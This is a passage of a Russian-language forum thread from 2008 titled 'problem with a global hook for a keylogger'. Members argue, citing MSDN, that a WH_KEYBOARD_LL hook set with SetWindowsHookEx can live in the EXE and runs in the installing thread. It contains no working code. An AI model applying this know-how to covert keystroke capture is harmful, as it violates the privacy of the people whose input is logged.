<I>dimaxmaster пишет:<br>В exe нельзя переносить, толку не будет. Из exe катит только на 95,98 и Ме Виндосах. 2000, XP и все из этой серии, то хук ставится только в dll </I><br>Чушь. Код выполняется в контексте потока, живущего в оригинальном процессе. То есть в твоём .exe. В примере код физически находится в .dll хотя логически принадлежит (и работает) только в .exe. Объясню с другой стороны - в других процессах этот код никогда не будет вызван - убери его из DLL и всё станет проще и красивее.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190647&amp;user=1737&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=13" class="addthx" data-post="190647"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="14" onfocus="this.blur()" href="JavaScript:di('[b]dimaxmaster[/b]','')">dimaxmaster</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 53.8 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 13.71'>Активность: 0.05<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=7375">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 30 мая 2008 09:12 <br><script type="text/javascript">QU('dimaxmaster','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=dimaxmaster" target="_blank">Личное сообщение</a> &middot;  <a href="#14" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#14');return false;">#14</a> </span><div align=left><br>
<b>Hellspawn</b>,<b>s0larian</b><br>Читаем MSDN:http://msdn.microsoft.com/en-us/library/ms644990.aspx<br><br>Цитата оттуда, кому лень ходить по ссылке:<br>HHOOK SetWindowsHookEx(      <br>    int idHook,<br>    HOOKPROC lpfn,<br>    HINSTANCE hMod,<br>    DWORD dwThreadId<br>);<br><br>lpfn<br>    [in] Pointer to the hook procedure. If the dwThreadId parameter is zero or specifies the identifier of a thread created by a different process, the lpfn parameter must point to a hook procedure in a DLL. Otherwise, lpfn can point to a hook procedure in the code associated with the current process. <br>hMod<br>    [in] Handle to the DLL containing the hook procedure pointed to by the lpfn parameter. The hMod parameter must be set to NULL if the dwThreadId parameter specifies a thread created by the current process and if the hook procedure is within the code associated with the current process. <br>dwThreadId<br>    [in] Specifies the identifier of the thread with which the hook procedure is to be associated. If this parameter is zero, the hook procedure is associated with all existing threads running in the same desktop as the calling thread.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190676&amp;user=7375&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=14" class="addthx" data-post="190676"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="15" onfocus="this.blur()" href="JavaScript:di('[b]Hellspawn[/b]','')">Hellspawn</a></b><br></div>
<img src="img/s8.gif" alt=""><br><img style="padding-top:3px;" src="av/72.gif" alt=""><br><span class=txtSm>Ранг: 990.2 <font color=red>(<b>! ! !</b>)</font>, 380thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.95'>Активность: 0.68<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=72">Модератор</a><br><font color=blue>Author of DiE</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 30 мая 2008 12:23 &middot; Поправил: Hellspawn <br><script type="text/javascript">QU('Hellspawn','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Hellspawn" target="_blank">Личное сообщение</a> &middot;  <a href="#15" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#15');return false;">#15</a> </span><div align=left><br>
я не пойму, ты что такой непонятливый? <img src="img/smilies/s1.gif" alt=""> те сказали, в ехе всё работает, ниже пролестнуть MSDN лень было?<br><br><i class=x><b>WH_KEYBOARD_LL</b><br>Windows NT/2000/XP: Installs a hook procedure that monitors low-level keyboard input events. For more information, see the LowLevelKeyboardProc hook procedure.<br>...<br>1. The system calls this function every time a new keyboard input event is about to be posted into a thread input queue. The keyboard input can come from the local keyboard driver or from calls to the keybd_event function.<br>2. This hook is called in the context of the thread that installed it.<br>...<br>а если по-русски, то WH_KEYBOARD срабатывает при попадании в очередь сообщений потока сообщений WM_KEYUP/WM_KEYDOWN, а <b>WH_KEYBOARD_L</b>L срабатывает при низкоуровневых клавиатурных событиях, поступающих от драйвера клавиатуры. И процедура обработки <b>WH_KEYBOARD_LL выполняется в контексте приложения, ставившего хук.</b><br></i>
<br><br><font size="1"><i>-----<br>[nice coder and reverser]</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=190702&amp;user=72&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=15" class="addthx" data-post="190702"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="16" onfocus="this.blur()" href="JavaScript:di('[b]s0larian[/b]','')">s0larian</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/1737.jpg" alt=""><br><span class=txtSm>Ранг: 387.4 (мудрец)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.19'>Активность: 0.17<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1737">Участник</a><br><font color=blue>системщик</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 30 мая 2008 19:53 &middot; Поправил: s0larian <br><script type="text/javascript">QU('s0larian','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=s0larian" target="_blank">Личное сообщение</a> &middot;  <a href="#16" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=11955.html&amp;page=0#16');return false;">#16</a> </span><div align=left><br>
<b>dimaxmaster</b>, ну и где ты видишь указание что код установщика должен жить в DLL? Думай головой - где живёт этот код, с точки зрения OS, не важно. Другой вопрос - где живёт код обработчика. Это разные вещи - сечёшь?
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=190754&amp;user=1737&amp;forum_n=6&amp;topic=11955.html&amp;page=0&amp;anchor=16" class="addthx" data-post="190754"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>


</table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b></b></span></td></tr></table>
<table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/p.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=6&sortBy=0&page=0.html"><b>Программирование</b></a> <b class=bulletHead>&#8212;&#8250;</b> проблема с глобальным хуком для кейлогера</span></td>
</tr></table>
</div>
<a name=newreply></a>
<script type="text/javascript">
function check_form(f)
{
  f.elements['b1'].value = 'Отправка...';
  f.elements['b1'].disabled = true;
  return true;
}
</script>

<div align="center">
<form name="postMsg" action="#17" method="post" class="formStyle" enctype="multipart/form-data" onsubmit="return check_form(this);" onkeydown="ctrle(event, this)">
<table class="forums">

<tr>
<td class="caption2">
<span class="txtSm"><b>:: Ваш ответ</b></span>
</td>
</tr>
<tr>
<td class="caption7">

<img class="toolButton" src="./img/button_bold.gif" width="23" height="22" border="0" title="Жирный" alt="Жирный" onmouseover="window.status='Жирный'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[b]','[/b]');">&nbsp;
<img class="toolButton" src="./img/button_italic.gif" width="23" height="22" border="0" title="Курсив" alt="Курсив" onmouseover="window.status='Курсив'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[t]','[/t]');">&nbsp;
<img class="toolButton" src="./img/button_underlined.gif" width="23" height="22" border="0" title="Подчеркнутый" alt="Подчеркнутый" onmouseover="window.status='Подчеркнутый'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[u]','[/u]');">&nbsp;
<img class="toolButton" src="./img/button_strike.gif" width="23" height="22" border="0" title="Перечеркнутый" alt="Перечеркнутый" onmouseover="window.status='Перечеркнутый'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[s]','[/s]');">&nbsp;
<img class="toolButton" src="./img/button_code.gif" width="23" height="22" border="0" title="Код" alt="{mpf5}" onmouseover="window.status='Код'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[ASM]','[/ASM]');">&nbsp;
<img class="toolButton" src="./img/button_image.gif" width="23" height="22" border="0" title="Ссылка на картинку" alt="Код" onmouseover="window.status='Ссылка на картинку'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[img]','[/img]');">&nbsp;
<img class="toolButton" src="./img/button_url.gif" width="23" height="22" border="0" title="Вставить ссылку" alt="Вставить ссылку" onmouseover="window.status='Вставить ссылку'; return true" onmouseout="window.status=''; return true" onclick="JavaScript:di('[url=',']--&gt; Link &lt;--[/url]');">&nbsp;

<!-- mod by arnix start 
<select style="position: relative; top: -7; width: 150px;" id="addHighlightedCode" onchange="insertHl(this);">
<option value="0">Подсветка кода...</option>
<option value="asm">Assembler</option>
<option value="c">C</option>
<option value="cpp">C++</option>
<option value="pascal">Pascal</option>
<option value="delphi">Delphi</option>
<option value="php">PHP</option>
<option value="vb">Visual Basic</option>
</select>&nbsp;
 mod by arnix end -->

<br>
<a href="JavaScript:di(':s1:','');"><img src="./img/smilies/s1.gif" border="0" alt=":s1:"></a>
<a href="JavaScript:di(':s2:','');"><img src="./img/smilies/s2.gif" border="0" alt=":s2:"></a>
<a href="JavaScript:di(':s3:','');"><img src="./img/smilies/s3.gif" border="0" alt=":s3:"></a>
<a href="JavaScript:di(':s4:','');"><img src="./img/smilies/s4.gif" border="0" alt=":s4:"></a>
<a href="JavaScript:di(':s5:','');"><img src="./img/smilies/s5.gif" border="0" alt=":s5:"></a>
<a href="JavaScript:di(':s6:','');"><img src="./img/smilies/s6.gif" border="0" alt=":s6:"></a>
<a href="JavaScript:di(':s7:','');"><img src="./img/smilies/s7.gif" border="0" alt=":s7:"></a>
<a href="JavaScript:di(':s8:','');"><img src="./img/smilies/s8.gif" border="0" alt=":s8:"></a>
<a href="JavaScript:di(':s9:','');"><img src="./img/smilies/s9.gif" border="0" alt=":s9:"></a>
<a href="JavaScript:di(':s10:','');"><img src="./img/smilies/s10.gif" border="0" alt=":s10:"></a>
<a href="JavaScript:di(':s11:','');"><img src="./img/smilies/s11.gif" border="0" alt=":s11:"></a>
<a href="JavaScript:di(':s12:','');"><img src="./img/smilies/s12.gif" border="0" alt=":s12:"></a>
<a href="JavaScript:di(':s13:','');"><img src="./img/smilies/s13.gif" border="0" alt=":s13:"></a>
<a href="JavaScript:di(':s14:','');"><img src="./img/smilies/s14.gif" border="0" alt=":s14:"></a>
<a href="JavaScript:di(':s15:','');"><img src="./img/smilies/s15.gif" border="0" alt=":s15:"></a>
<a href="JavaScript:di(':s16:','');"><img src="./img/smilies/s16.gif" border="0" alt=":s16:"></a>
</td></tr>
<tr>
<td class="caption5"><textarea name="postText" rows="10" class="textForm" tabindex="2" style="width:100%"></textarea>
<BR><INPUT class="textForm" type="file" name="fileAttach"><BR><SMALL>Максимальный размер аттача: <b>500KB</b>.</SMALL>
<br><span class="txtSm"> </span>
</td>
</tr>
<tr>
<td class="caption7">
<table class=tbTransparent>
<tr valign=middle>
<td class=tbTransparent><span class=txtSm>Ваш логин: <b><a href="https://exelab.ru/f/action=userinfo&amp;user=55973">german1505</a></b>  &raquo; <a href="mode=logout">Выход</a> &raquo; <a href="?action=pmail"><b>ЛС</b></a></span></td>
</tr>
</table>

</td>
</tr>


<tr>
<td class="caption5"><input type="submit" value="Отправить сообщение" class="inputButton" name="b1" tabindex="5"></td>
</tr>
</table>
<input type="hidden" name="action" value="pthread">
<input type="hidden" name="forum" value="6">
<input type="hidden" name="topic" value="11955">
</form>
</div>
<script type="text/javascript" src="templates/vthread_logged.js"></script>
<div align=center><table class=tbTransparent><tr>
<td class=tbTransparent><span class=txtSm>      &nbsp;&nbsp;&nbsp;<a href="/f/forprint.php?topic_id=11955" title="Версия для печати"><img src="img/forprint.gif" border="0" alt="Для печати"> Для печати</a>&nbsp;</span></td>
</tr></table></div>
<br>
 
<br><br><br></center>

</div>
<div id="footer">Вы находитесь на EXELAB.rU</div>
<div id="footer_btns">
<a href="http://www.reactos.org" rel="nofollow" target="_blank"><img src="./images/react.png" height="31" width="88" border="0" title="" alt=""></a> <script type="text/javascript"><!--
document.write("<img src='//counter.yadro.ru/hit?t44.2;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";h"+escape(document.title.substring(0,80))+";"+Math.random()+
"' "+
"border='0' width='31' height='31'>")
//--></script>
</div>
</div>

</body></html>
